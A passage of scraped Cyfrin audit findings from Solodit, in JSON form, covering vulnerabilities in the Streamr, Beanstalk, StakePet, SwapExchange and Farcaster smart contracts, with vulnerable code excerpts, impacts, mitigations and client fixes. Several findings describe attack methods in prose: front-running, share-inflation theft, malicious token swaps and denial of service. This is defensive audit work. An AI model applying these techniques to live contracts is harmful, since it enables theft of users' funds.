    "Client": [
        " Fixed in commit 05d9716. Flag targets with not enough stake (to pay for the review) will be kicked out without review. Since this can only happen after the admin changes the minimum stake requirement (e.g. by increasing reviewer rewards), the flag target is not at fault and will not be slashed. They can stake back again with the new minimum stake if they want."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/possible-front-running-of-flag-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "File: contracts\\OperatorTokenomics\\SponsorshipPolicies\\VoteKickPolicy.sol\n65:     function onFlag(address target, address flagger) external {\n66:         require(flagger != target, \"error_cannotFlagSelf\");\n67:         require(voteStartTimestamp[target] == 0 && block.timestamp > protectionEndTimestamp[target], \"error_cannotFlagAgain\"); // solhint-disable-line not-rely-on-time\n68:         require(stakedWei[flagger] >= minimumStakeOf(flagger), \"error_notEnoughStake\");\n69:         require(stakedWei[target] > 0, \"error_flagTargetNotStaked\"); //@audit possible front run\n70:\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The target might call unstake()/forceUnstake() before a flagger calls flag() to avoid a possible fund loss. Also, there would be no slash during the unstaking for target when it meets the penaltyPeriodSeconds requirement."
    ],
    "Impact": [
        " A malicious target would bypass the kick policy by front running."
    ],
    "Recommended Mitigation": [
        " There is no straightforward mitigation but we could implement a kind of delayed unstaking logic for some percent of staking funds."
    ],
    "Client": [
        " Our current threat model is a staker who doesn't run a Streamr node. They could be a person using Metamask to do all smart contract transactions via our UI, or they could be a complex flashbot MEV searcher. But if they're not running Streamr nodes, they should be found out, flagged, and kicked out by the honest nodes.",
        "While an advanced bot could stake and listen to Flagged events, if they're found out and flagged before their minimum stay (DefaultLeavePolicy.penaltyPeriodSeconds) is over, their stake would still get slashed even if they front-run the flagging. We aim to select our network parameters so that it will be very likely that someone staking but not actually running a Streamr node would get flagged during those penaltyPeriodSeconds. Then front-running the flagging wouldn't save them from slashing."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/operators-can-bypass-a-leavepenalty-using-reducestaketo-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " Operators should pay a leave penalty when they unstake earlier than expected.\nBut there are no relevant requirements in reduceStakeTo() so they can reduce their staking amount to the minimum value."
    ],
    "Impact": [
        " Operators will pay a leavePenalty for the minimum amount only."
    ],
    "Recommended Mitigation": [
        " The penalty should be the same, whether an Operator only calls forceUnstake, or first calls reduceStakeTo."
    ],
    "Client": [
        " Fixed in commit 72323d0."
    ],
    "Cyfrin": [
        " Verified"
    ]
}
----End JSON----

https://solodit.xyz/issues/in-operator_transfer-ondelegate-should-be-called-after-updating-the-token-balances-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "File: contracts\\OperatorTokenomics\\Operator.sol\n324:         // transfer creates a new delegator: check if the delegation policy allows this \"delegation\"\n325:         if (balanceOf(to) == 0) {\n326:             if (address(delegationPolicy) != address(0)) {\n327:                 moduleCall(address(delegationPolicy), abi.encodeWithSelector(delegationPolicy.onDelegate.selector, to)); //@audit\nshould be called after _transfer()\n328:             }\n329:         }\n330:\n331:         super._transfer(from, to, amount);\n332:\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In _transfer(), onDelegate() is called to validate the owner's minimumSelfDelegationFraction requirement.",
        "But onDelegate() is called before updating the token balances and the below scenario would be possible."
    ],
    "Impact": [
        " The operator owner might transfer his shares to other delegators in anticipation of slashing, to avoid slashing."
    ],
    "Recommended Mitigation": [
        " onDelegate() should be called after super._transfer()."
    ],
    "Client": [
        " Fixed in commit 93d6105."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/centralization-risk-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol has a DEFAULT_ADMIN_ROLE with privileged rights to perform admin tasks that can affect users. Especially, the owner can change the fee/reward fraction settings and various policies.",
        "Most admin functions don't emit events at the moment."
    ],
    "Impact": [
        " While the protocol owner is regarded as a trusted party, the owner can change many settings and policies without logging. This might lead to unexpected results and users might be affected."
    ],
    "Recommended Mitigation": [
        " Specify the owner's privileges and responsibilities in the documentation.\nAdd constant state variables that can be used as the minimum and maximum values for the fraction settings.\nLog the changes in the important state variables via events."
    ],
    "Client": [
        " Logging added to StreamrConfig in commit c530ec5. Better documentation and more logging added to other contracts in commit c343850. Those commits partially mitigate risks associated with leaking of the admin key.",
        "In StreamrConfig, there isn't much difference in the power to change the config values, and in replacing the whole contract (it's upgradeable). Some maximum and minimum limits exist currently, but their main point is to sanity-check new values, especially the initial values. \"Binding our hands\" with tighter limits wouldn't thus really change anything, at best it would signal an intent.",
        "Before using these admin powers to change config values or amend the contracts using upgrades, wider review (community, auditors) will be needed, to avoid unexpected side-effects that may affect users. The day-to-day is not designed to require any admin intervention. Admin powers are only needed for unforeseen circumstances (e.g. hotfixing bugs) or planned policy changes. There is no foreseeable need for such changes at the moment."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/ontokentransfer-does-not-validate-if-the-call-is-from-the-data-token-contract-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "       if (msg.sender != address(token)) {\n           revert AccessDeniedDATATokenOnly();\n       }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " SponsorshipFactory::onTokenTransfer and OperatorFactory::onTokenTransfer are used to handle the token transfer and contract deployment in a single transaction. But there is no validation that the call is from the DATA token contract and anyone can call these functions.",
        "The impact is low for Sponsorship deployment, but for Operator deployment, ClonesUpgradeable.cloneDeterministic is used with a salt based on the operator token name and the operator address. An attacker can abuse this to cause DoS for deployment.",
        "We see that this validation is implemented correctly in other contracts like Operator."
    ],
    "Impact": [
        " Attackers can prevent the deployment of Operator contracts."
    ],
    "Recommended Mitigation": [
        " Add a validation to ensure the caller is the actual DATA contract."
    ],
    "Client": [
        " Fixed in commit 8b13df4."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/migration-of-unripe-lp-from-bean3crv-to-beaneth-does-not-account-for-recapitalization-accounting-error-cyfrin-none-cyfrin-beanstalk-bip-38-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " The global AppStorage::recapitalized state refers to the dollar amount recapitalized when Fertilizer was bought with USDC and paired with BEAN for BEAN:3CRV LP. When removing this underlying liquidity and swapping 3CRV for WETH during the migration of unripe LP, it is very likely that the BCM will experience some slippage. This is more likely to be the case if the swap is made on the open market rather than an OTC deal, but either way it is likely that the dollar value of the resulting WETH, and hence BEAN:ETH LP, will be less than it was as BEAN:3CRV before the migration. Currently, UnripeFacet::addMigratedUnderlying updates the BEAN:ETH LP token balance underlying the unripe LP, completing the migration, but does not account for any changes in the dollar value as outlined above. Based on the current implementation, it is very likely that the BCM will complete migration by transferring less in dollar value while the recapitalization status remains the same, causing inconsistency in LibUnripe::percentLPRecapped and LibUnripe::add/removeUnderlying which are used in the conversion of urBEAN \u2194 urBEANETH in LibUnripeConvert. Therefore, the global recapitalized state should be updated to reflect the true dollar value of recapitalization on completion of the migration."
    ],
    "Impact": [
        " Once sufficiently funded by purchasers of Fertilizer, it is possible that recapitalization could be considered completed with insufficient underlying BEAN:ETH LP. This amounts to a loss of user funds since the true recapitalized amount will be less than that specified by C::dollarPerUnripeLP which is used to calculate the total dollar liability in LibFertilizer::remainingRecapitalization."
    ],
    "Recommended Mitigation": [
        " Reassign s.recapitalized to the oracle USD amount of the new BEAN:ETH LP at the time of migration completion."
    ],
    "Beanstalk Farms": [
        " This is intentional \u2013 the cost of slippage goes to the Unripe LP token holders. This should be clearly stated in the BIP draft."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/insufficient-validation-of-new-fertilizer-ids-allow-for-a-denial-of-service-dos-attack-on-seasonfacetgm-when-above-peg-once-the-last-element-in-the-fifo-is-paid-cyfrin-none-cyfrin-beanstalk-bip-38-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// Previous code\n\n    function addUnderlying(uint256 amount, uint256 minAmountOut) internal {\n        //...\n        C.bean().mint(\n            address(this),\n            newDepositedBeans.add(newDepositedLPBeans)\n        );\n\n        // Add Liquidity\n        uint256 newLP = C.curveZap().add_liquidity(\n            C.CURVE_BEAN_METAPOOL, // where to add liquidity\n            [\n                newDepositedLPBeans, // BEANS to add\n                0,\n                amount, // USDC to add\n                0\n            ], // how much of each token to add\n            minAmountOut // min lp ampount to receive\n        ); // @audit-ok Does not admit depositing 0 --> https://etherscan.io/address/0x5F890841f657d90E081bAbdB532A05996Af79Fe6#code#L487\n\n        // Increment underlying balances of Unripe Tokens\n        LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);\n        LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);\n\n        s.recapitalized = s.recapitalized.add(amount);\n    }\n",
        "    function addUnderlying(uint256 usdAmount, uint256 minAmountOut) internal {\n        AppStorage storage s = LibAppStorage.diamondStorage();\n        // Calculate how many new Deposited Beans will be minted\n        uint256 percentToFill = usdAmount.mul(C.precision()).div(\n            remainingRecapitalization()\n        );\n        uint256 newDepositedBeans;\n        if (C.unripeBean().totalSupply() > s.u[C.UNRIPE_BEAN].balanceOfUnderlying) {\n            newDepositedBeans = (C.unripeBean().totalSupply()).sub(\n                s.u[C.UNRIPE_BEAN].balanceOfUnderlying\n            );\n            newDepositedBeans = newDepositedBeans.mul(percentToFill).div(\n                C.precision()\n            );\n        }\n\n        // Calculate how many Beans to add as LP\n        uint256 newDepositedLPBeans = usdAmount.mul(C.exploitAddLPRatio()).div(\n            DECIMALS\n        );\n\n        // Mint the Deposited Beans to Beanstalk.\n        C.bean().mint(\n            address(this),\n            newDepositedBeans\n        );\n\n        // Mint the LP Beans to the Well to sync.\n        C.bean().mint(\n            address(C.BEAN_ETH_WELL),\n            newDepositedLPBeans\n        );\n\n        // @audit If nothing was previously deposited this function returns 0, IT DOES NOT REVERT\n        uint256 newLP = IWell(C.BEAN_ETH_WELL).sync(\n            address(this),\n            minAmountOut\n        );\n\n        // Increment underlying balances of Unripe Tokens\n        LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);\n        LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);\n\n        s.recapitalized = s.recapitalized.add(usdAmount);\n    }\n",
        "    function push(uint128 id) internal {\n        AppStorage storage s = LibAppStorage.diamondStorage();\n        if (s.fFirst == 0) {\n            // Queue is empty\n            s.season.fertilizing = true;\n            s.fLast = id;\n            s.fFirst = id;\n        } else if (id <= s.fFirst) {\n            // Add to front of queue\n            setNext(id, s.fFirst);\n            s.fFirst = id;\n        } else if (id >= s.fLast) { // @audit this block is entered twice\n            // Add to back of queue\n            setNext(s.fLast, id); // @audit the second time, a reference is added to the same id\n            s.fLast = id;\n        } else {\n            // Add to middle of queue\n            uint128 prev = s.fFirst;\n            uint128 next = getNext(prev);\n            // Search for proper place in line\n            while (id > next) {\n                prev = next;\n                next = getNext(next);\n            }\n            setNext(prev, id);\n            setNext(id, next);\n        }\n    }\n",
        "    function pop() internal returns (bool) {\n        AppStorage storage s = LibAppStorage.diamondStorage();\n        uint128 first = s.fFirst;\n        s.activeFertilizer = s.activeFertilizer.sub(getAmount(first)); // @audit getAmount(first) would return 0\n        uint128 next = getNext(first);\n        if (next == 0) { // @audit next != 0, therefore this conditional block is skipped\n            // If all Unfertilized Beans have been fertilized, delete line.\n            require(s.activeFertilizer == 0, \"Still active fertilizer\");\n            s.fFirst = 0;\n            s.fLast = 0;\n            s.season.fertilizing = false;\n            return false;\n        }\n        s.fFirst = getNext(first); // @audit this gets s.first again\n        return true; // @audit always returns true for a self-referential node\n    }\n"
    ],
    "Description": [
        " A Fertilizer NFT can be interpreted as a bond without an expiration date which is to be repaid in Beans and includes interest (Humidity). This bond is placed in a FIFO list and intended to recapitalize the $77 million in liquidity stolen during the April 2022 exploit. One Fertilizer can be purchased for 1 USD worth of WETH:\u00a0prior to BIP-38, this purchase was made using USDC.",
        "Each fertilizer is identified by an Id that depends on s.bpf, indicating the cumulative amount of Beans paid per Fertilizer. This value increases each time Sun::rewardToFertilizer is called, invoked by SeasonFacet::gm if the Bean price is above peg. Therefore, Fertilizer IDs depend on s.bpf at the moment of minting, in addition to the amount of Beans to be paid.",
        "The FIFO list has following components:",
        "Methods related to this FIFO list include:\nLibFertilizer::push: Add an element to the FIFO list.\nLibFertilizer::setNext: Given a fertilizer id, add a pointer to next element in the list\nLibFertilizer::getNext: Get next element in the list.",
        "The intended behaviour of this list is to add a new element to its end whenever a new fertilizer is minted with a new Id. Intermediate addition to the list was formerly allowed only by the Beanstalk DAO, but this functionality has since been deprecated in the current upgrade with the removal of FertilizerFacet::addFertilizerOwner.",
        "Consequences of replacing BEAN:3CRV MetaPool with the BEAN:ETH Well:\nBefore this upgrade, addition of 0 Fertilizer through LibFertilizer::addFertilizer was impossible due to the dependency on Curve in LibFertilizer::addUnderlying:",
        "However, with the change of dependency involved in the Wells integration, this restriction no longer holds:",
        "Given that the new integration does not revert when attempting to add 0 Fertilizer, it is now possible to add a self-referential node to the end FIFO list, but only if this is the first Fertilizer NFT to be minted for the current season by twice calling FertilizerFacet.mintFertilizer(0, 0, 0, mode). The validation performed to prevent duplicate ids is erroneously bypassed given the Fertilizer amount for the given Id remains zero.",
        "Despite first perhaps seeming harmless, this element can never be remove unless otherwise overridden:",
        "LibFertilizer::pop is used in Sun::rewardToFertilizer which is called through Sun::rewardBeans when fertilizing. This function is called through Sun::stepSun if the current Bean price is above peg. By preventing the last element from being popped from the list, assuming this element is reached, an infinite loop occurs given that the while loop continues to execute, resulting in denial-of-service on SeasonFacet::gm when above peg.",
        "The most remarkable detail of this issue is that this state can be forced when above peg and having already been fully recapitalized. Given that it is not possible to mint additional Fertilizer with the associated Beans, this means that a DoS attack can be performed on SeasonFacet::gm once recapitalization is reached if the BEAN price is above peg."
    ],
    "Impact": [
        " It is possible to perform a denial-of-service (DoS) attack on SeasonFacet::gm if the Bean price is above the peg, either once fully recapitalized or when reaching the last element of the Fertilizer FIFO list."
    ],
    "Proof of Concept": [
        " This coded PoC can be run by:"
    ],
    "Recommended Mitigation": [
        " Despite being a complex issue to explain, the solution is as simple as replacing > with >= in LibFertilizer::addFertilizer as below:"
    ],
    "Beanstalk Farms": [
        " Added a > 0 check to the mintFertilizer function in commit hash 4489cb8."
    ],
    "Cyfrin": [
        " Acknowledged. The Beanstalk Farms team has opted to add validation in FertilizerFacet::mintFertilizer. This alternative saves more gas compared to the one suggested; however, this issue should be considered in the future if LibFertilizer::addFertilizer is used anywhere else. This is the case in FertilizerFacet::addFertilizerOwner but assumedly will not be an issue as the owner would not send this type of transaction.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/attackers-can-use-a-malicious-yield-token-to-steal-funds-from-users-cyfrin-none-cyfrin-stakepet-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " High"
    ],
    "Description": [
        " According to the documentation and the current implementation, anyone can create a new StakePet contract and feed any address for the YIELD_TOKEN. As long as a contract implements IYieldToken interface, the contract will be created without problems.",
        "An attacker can create a malicious IYieldToken implementation and use that to steal funds from users.\nThe StakePet contract relies on YIELD_TOKEN.toToken() and YIELD_TOKEN.toValue() in numerous places for accounting.\nConsider a contract that has implemented different logic in toToken() and toValue() according to the owner's hidden flag.\nThe attacker is likely to let the malicious token contract work normally till the StakePet contract gets enough deposits.\nThen they can switch the hidden flag as they needed to mess the accounting and take profit from it.\nIn the worst case, they can even manipulate the output of IYieldToken::ERC20_TOKEN() (maybe to freeze the user funds permanently)."
    ],
    "Impact": [
        " User funds can be stolen or permanently locked."
    ],
    "Recommended Mitigation": [
        " Consider maintaining a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens."
    ],
    "Client": [
        " Fixed in commit 308672e."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/inflation-attack-can-cause-early-users-to-lose-their-deposit-cyfrin-none-cyfrin-stakepet-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " High"
    ],
    "Description": [
        " A malicious StakePet contract creator can steal funds from depositors by launching a typical inflation attack. To execute the attack, the creator can first deposit 1 wei to get 1 wei of ownership. Creator can subsequently send a big amount of collateral directly to the StakePet contract - this will hugely inflate the value of the single share.",
        "Now, all subsequent pet owners who deposit their collateral will get no ownership in return. The StakePet::ownershipToMint function uses StakePet::totalValue to calculate the ownership of a new depositor. While the total ownership represented by s_totalOwnership remains the same 1 wei, the totalValueBefore is a huge number, thanks to a large direct deposit done by the creator. This ensures that the 1 wei of share represents a huge value of collateral & causes the ownership of new depositors to round to 0."
    ],
    "Impact": [
        " Potential complete loss of funds for new depositors, given they receive no ownership in exchange for their deposited tokens."
    ],
    "Proof of Concept": [
        ""
    ],
    "Recommended Mitigation": [
        " Inflation attacks have known defences. A comprehensive discussion can be found here.",
        "One noteworthy method, as implemented by Uniswap V2, involves depositing minimal liquidity into the contract and transferring its ownership to a null address, creating \"dead shares\". This technique protects the subsequent depositor from potential inflation attacks.",
        "In this case, it might be beneficial to introduce a minimum collateral requirement during contract initiation, and accordingly adjust s_totalOwnership to match this preset collateral."
    ],
    "Client": [
        " Fixed in commit a692abc and 21dd15b."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/a-malicious-user-can-grief-a-stakepet-contract-by-creating-massive-number-of-pets-cyfrin-none-cyfrin-stakepet-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The StakePet::create function facilitates the minting of a pet NFT by depositing collateral. However, its lack of a minimum deposit requirement for minting exposes it to potential abuse. A malicious user can exploit this by minting an excessive number of NFTs. Notably, this behaviour can strain functions like StakePetManager::buryAllDeadPets, which in turn calls StakePetManager::getDeadNonBuriedPets. This latter function iterates through all pet IDs to identify pets that are dead but not yet buried."
    ],
    "Impact": [
        " When a function processes an extensive and potentially unlimited list of pet IDs, there's a risk of it consuming all available gas. Consequently, it can fail, throwing an out-of-gas exception, which negatively affects users trying to interact with the contract."
    ],
    "Recommended Mitigation": [
        " To deter such griefing attacks, it's advisable to introduce a minimum deposit requirement for the creation of a new pet. Setting this threshold ensures that the mass-minting strategy becomes cost-prohibitive for attackers."
    ],
    "Client": [
        " Fixed in commit a692abc."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/use-safe-transfer-for-erc20-tokens-cyfrin-none-cyfrin-swapexchange-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "TransferUtils.sol\n34:     function _transferERC20(address token, address to, uint256 amount) internal {\n35:         IERC20 erc20 = IERC20(token);\n36:         require(erc20 != IERC20(address(0)), \"Token Address is not an ERC20\");\n37:         uint256 initialBalance = erc20.balanceOf(to);\n38:         require(erc20.transfer(to, amount), \"ERC20 Transfer failed\");//@audit-issue will revert for USDT\n39:         uint256 balance = erc20.balanceOf(to);\n40:         require(balance >= (initialBalance + amount), \"ERC20 Balance check failed\");\n41:     }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol intends to support all ERC20 tokens but the implementation uses the original transfer functions.\nSome tokens (like USDT) do not implement the EIP20 standard correctly and their transfer/transferFrom function return void instead of a success boolean. Calling these functions with the correct EIP20 function signatures will revert."
    ],
    "Impact": [
        " Tokens that do not correctly implement the EIP20 like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value."
    ],
    "Recommended Mitigation": [
        " We recommend using OpenZeppelin's SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens."
    ],
    "Protocol": [
        " Fixed in commit 564f711"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/fee-on-transfer-tokens-are-not-supported-cyfrin-none-cyfrin-swapexchange-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "TransferUtils.sol\n34:     function _transferERC20(address token, address to, uint256 amount) internal {\n35:         IERC20 erc20 = IERC20(token);\n36:         require(erc20 != IERC20(address(0)), \"Token Address is not an ERC20\");\n37:         uint256 initialBalance = erc20.balanceOf(to);\n38:         require(erc20.transfer(to, amount), \"ERC20 Transfer failed\");\n39:         uint256 balance = erc20.balanceOf(to);\n40:         require(balance >= (initialBalance + amount), \"ERC20 Balance check failed\");//@audit-issue reverts for fee on transfer token\n41:     }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol intends to support all ERC20 tokens but does not support fee-on-transfer tokens.\nThe protocol utilizes the functions TransferUtils::_transferERC20() and TransferUtils::_transferFromERC20() to transfer ERC20 tokens.",
        "The implementation verifies that the transfer was successful by checking that the balance of the recipient is greater than or equal to the initial balance plus the amount transferred. This check will fail for fee-on-transfer tokens because the actual received amount will be less than the input amount. (Read here about fee-on-transfer tokens)",
        "Although there are very few fee-on-transfer tokens, the protocol can't say it supports all ERC20 tokens if it doesn't support these weird ERC20 tokens."
    ],
    "Impact": [
        " Fee-on-transfer tokens can not be used for the protocol.\nBecause of the rarity of these tokens, we evaluate this finding as a Medium risk."
    ],
    "Recommended Mitigation": [
        " The transfer utility functions can be updated to return the actually received amount.\nOr clearly document that only standard ERC20 tokens are supported."
    ],
    "Protocol": [
        " We are choosing not to implement this at this stage."
    ],
    "Cyfrin": [
        " Acknowledged. As recommended, please mention this in user documentation."
    ]
}
----End JSON----

https://solodit.xyz/issues/centralization-risk-cyfrin-none-cyfrin-swapexchange-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "FeeData.sol\n31:     function setFeeValue(uint256 feeValue) external onlyOwner {\n32:         require(feeValue < _feeDenominator, \"Fee percentage must be less than 1\");\n33:         _feeValue = feeValue;\n34:     }\n\n43:\n44:     function setFixedFee(uint256 fixedFee) external onlyOwner {//@audit-issue validate min/max\n45:         _fixedFee = fixedFee;\n46:     }\n",
        "File: helpers/FeeData.sol\n\n31:     function setFeeValue(uint256 feeValue) external onlyOwner {\n\n36:     function setMaxHops(uint256 maxHops) external onlyOwner {\n\n40:     function setMaxSwaps(uint256 maxSwaps) external onlyOwner {\n\n44:     function setFixedFee(uint256 fixedFee) external onlyOwner {\n\n48:     function setFeeToken(address feeTokenAddress) public onlyOwner {\n\n53:     function setFeeTokens(address[] memory feeTokenAddresses) public onlyOwner {\n\n60:     function clearFeeTokens() public onlyOwner {\n\n",
        "File: helpers/TransferHelper.sol\n\n86:     function setRewardHandler(address rewardAddress) external onlyOwner {\n\n92:     function setRewardsActive(bool _rewardsActive) external onlyOwner {\n\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " The protocol has an owner with privileged rights to perform admin tasks that can affect users.\nEspecially, the owner can change the fee settings and reward handler address."
    ],
    "Impact": [
        " While the protocol owner is regarded as a trusted party, the owner can change the fee settings and reward handler address without any validation or logging. This can lead to unexpected results and users can be affected."
    ],
    "Recommended Mitigation": [
        ""
    ],
    "Protocol": [
        ""
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/idregistrytransfertransferfor-might-be-revoked-by-a-recovery-address-cyfrin-none-cyfrin-farcaster-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In every fid, there exists an owner and a recovery address, each possessing identical authority, enabling either one to modify the other.\nBut while transferring the fid, it just changes the owner and this scenario might be possible."
    ],
    "Impact": [
        " IdRegistry.transfer/transferFor() might be revoked by a recovery address."
    ],
    "Recommended Mitigation": [
        " Recommend adding a function like transferAll() to update both owner/recovery."
    ],
    "Client": [
        "\nFixed by adding transferAndChangeRecovery and transferAndChangeRecoveryFor to IdRegistry. Commit: d389f9f"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/a-removal-signature-might-be-applied-to-the-wrong-fid-cyfrin-none-cyfrin-farcaster-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    function _verifyRemoveSig(address fidOwner, bytes memory key, uint256 deadline, bytes memory sig) internal {\n        _verifySig(\n            _hashTypedDataV4(\n                keccak256(abi.encode(REMOVE_TYPEHASH, fidOwner, keccak256(key), _useNonce(fidOwner), deadline))\n            ),\n            fidOwner,\n            deadline,\n            sig\n        );\n    }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " A remove signature is used to remove a key from fidOwner using KeyRegistry.removeFor(). And the signature is verified in _verifyRemoveSig().",
        "But the signature doesn't specify a fid to remove and the below scenario would be possible.",
        "Once a key is removed, KeyState will be changed to REMOVED and anyone including the owner can't retrieve it."
    ],
    "Impact": [
        " A key remove signature might be used for an unexpected fid."
    ],
    "Recommended Mitigation": [
        " The removal signature should contain fid also to be invalidated for another fid."
    ],
    "Client": [
        "\nAcknowledged. This is an intentional design tradeoff that makes it possible to register a fid and add a key in a single transaction, without knowing the caller's assigned fid in advance. We accept that this has the consequence described in the finding, and users should interpret key registry actions as \u201cadd key to currently owned fid.\u201d",
        "Nonces provide some protection against this scenario: if Alice wants to revoke her previous signature intended for fid1, she can increment her nonce to invalidate the signature."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/votekickpolicy_endvote-might-revert-forever-due-to-underflow-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "File: contracts\\OperatorTokenomics\\StreamrConfig.sol\n22:     /**\n23:      * Minimum amount to pay reviewers+flagger\n24:      * That is: minimumStakeWei >= (flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei) / slashingFraction\n25:      */\n26:     function minimumStakeWei() public view returns (uint) {\n27:         return (flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei) * 1 ether / slashingFraction;\n28:     }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In onFlag(), targetStakeAtRiskWei[target] might be less than the total rewards for the flagger/reviewers due to rounding.",
        "The above scenario is possible only when there is a rounding during minimumStakeWei calculation. So it works properly with the default slashingFraction = 10%."
    ],
    "Impact": [
        " The VoteKickPolicy wouldn't work as expected and malicious operators won't be kicked forever."
    ],
    "Recommended Mitigation": [
        " Always round the minimumStakeWei() up."
    ],
    "Client": [
        " Fixed in commit 615b531."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/possible-overflow-in-_payoutfirstinqueue-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "uint amountOperatorTokens = moduleCall(address(exchangeRatePolicy), abi.encodeWithSelector(exchangeRatePolicy.operatorTokenToDataInverse.selector, amountDataWei));\n",
        "   function operatorTokenToDataInverse(uint dataWei) external view returns (uint operatorTokenWei) {\n       return dataWei * this.totalSupply() / valueWithoutEarnings();\n   }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In _payOutFirstInQueue(), possible revert during operatorTokenToDataInverse().",
        "If a delegator calls undelegate() with type(uint256).max, operatorTokenToDataInverse() will revert due to uint overflow and the queue logic will be broken forever."
    ],
    "Impact": [
        " The queue logic will be broken forever because _payOutFirstInQueue() keeps reverting."
    ],
    "Recommended Mitigation": [
        " We should cap amountDataWei before calling operatorTokenToDataInverse()."
    ],
    "Client": [
        " Fixed in commit c62e5d9."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/wrong-validation-in-defaultundelegationpolicyonundelegate-cyfrin-none-cyfrin-streamr-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "   function onUndelegate(address delegator, uint amount) external {\n       // limitation only applies to the operator, others can always undelegate\n       if (delegator != owner) { return; }\n\n       uint actualAmount = amount < balanceOf(owner) ? amount : balanceOf(owner); //@audit amount:DATA, balanceOf:Operator\n       uint balanceAfter = balanceOf(owner) - actualAmount;\n       uint totalSupplyAfter = totalSupply() - actualAmount;\n       require(1 ether * balanceAfter >= totalSupplyAfter * streamrConfig.minimumSelfDelegationFraction(), \"error_selfDelegationTooLow\");\n   }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In onUndelegate(), it checks if the operator owner still holds at least minimumSelfDelegationFraction of total supply.",
        "But amount means the DATA token amount and balanceOf(owner) indicates the Operator token balance and it's impossible to compare them directly."
    ],
    "Impact": [
        " The operator owner wouldn't be able to undelegate because onUndelegate() works unexpectedly."
    ],
    "Recommended Mitigation": [
        " onUndelegate() should compare amounts after converting to the same token."
    ],
    "Client": [
        " Fixed in commit 9b8c65e."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/flood-mechanism-is-susceptible-to-dos-attacks-by-a-frontrunner-breaking-re-peg-mechanism-when-bean-is-above-1-usd-cyfrin-none-cyfrin-beanstalk-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    function getDeltaB() internal view returns (int256 deltaB) {\n        uint256[2] memory balances = C.curveMetapool().get_balances();\n        uint256 d = getDFroms(balances);\n        deltaB = getDeltaBWithD(balances[0], d);\n    }\n"
    ],
    "Description": [
